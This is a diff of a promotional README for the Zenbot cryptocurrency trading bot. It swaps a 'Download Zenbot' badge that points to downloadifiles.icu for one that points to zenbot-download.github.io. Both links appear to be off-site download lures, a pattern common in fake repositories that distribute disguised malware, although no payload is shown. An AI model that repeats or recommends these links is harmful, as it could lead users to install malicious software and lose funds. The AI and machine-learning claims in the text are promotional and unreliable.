@@ -1,7 +1,6 @@
 **Zenbot** is an open-source cryptocurrency trading bot that automates trading strategies on various exchanges. It uses artificial intelligence (AI) and machine learning algorithms to analyze market trends and execute buy or sell orders based on predefined strategies. Zenbot supports high-frequency trading and is highly customizable, allowing users to adjust trading parameters, strategies, and risk management to suit their preferences. While powerful and efficient, it requires technical knowledge and coding experience to set up and use effectively. Zenbot is ideal for users looking to implement algorithmic trading strategies and automate their cryptocurrency trading. 
 
-[![Download Zenbot](https://img.shields.io/badge/Download-Zenbot%20-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9
-)
+[![Download Zenbot](https://img.shields.io/badge/Download-Zenbot%20-blueviolet)](https://zenbot-download.github.io/.github/)
 
 **Key Features of Zenbot:**
 - **Open Source:** Completely free and customizable, with the code available for anyone to modify.
